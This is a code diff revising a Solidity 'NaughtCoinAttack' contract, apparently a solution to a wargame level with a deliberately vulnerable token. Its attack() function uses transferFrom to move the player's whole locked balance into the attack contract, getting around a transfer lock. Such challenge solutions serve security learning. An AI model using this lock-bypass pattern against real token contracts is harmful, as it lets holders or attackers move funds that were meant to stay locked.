@@ -2,43 +2,35 @@
 
 pragma solidity ^0.8.0;
 
-import "./NaughtCoin.sol";
+interface INaughtCoin {
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address owner, address spender, uint256 amount) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function player() external view returns (address);
+}
 
 contract NaughtCoinAttack {
-    NaughtCoin private naughtCoin;
-    address public immutable owner;
+    INaughtCoin private naughtCoin;
     address public immutable spender;
+    address public immutable player;
 
     constructor(address _naughtCoinAddress) {
-        naughtCoin = NaughtCoin(_naughtCoinAddress);
-        owner = msg.sender; // holder of the tokens
-        spender = address(this); // this contract
-    }
-
-    function approveAttack() public {
-        // Ensure only the owner can approve the attack
-        require(msg.sender == owner, "Only the owner can approve the attack");
-
-        // Get current balance of the owner's tokens
-        uint256 ownerBalance = naughtCoin.balanceOf(owner);
-
-        // Approve spender to spend all of the owner's tokens
-        naughtCoin.approve(spender, ownerBalance);
+        naughtCoin = INaughtCoin(_naughtCoinAddress);
+        spender = address(this);
+        player = naughtCoin.player();
     }
 
     function attack() public {
-        // Get current balance of the owner's tokens
-        uint256 ownerBalance = naughtCoin.balanceOf(owner);
-
-        // Transfer all of the owner's tokens to this contract, must be called from this contract
-        naughtCoin.transferFrom(owner, spender , ownerBalance);
-    }
-
-    function getAllowance() public view returns (uint256) {
-        return naughtCoin.allowance(owner, spender);
+        uint256 ownerBalance = naughtCoin.balanceOf(player);
+        naughtCoin.transferFrom(player, spender, ownerBalance);
     }
 
     function getBalance() public view returns (uint256) {
-        return naughtCoin.balanceOf(owner);
+        return naughtCoin.balanceOf(player);
+    }
+
+    function getAllowance(address _owner, address _spender) public view returns (uint256) {
+        return naughtCoin.allowance(_owner, _spender);
     }
 }
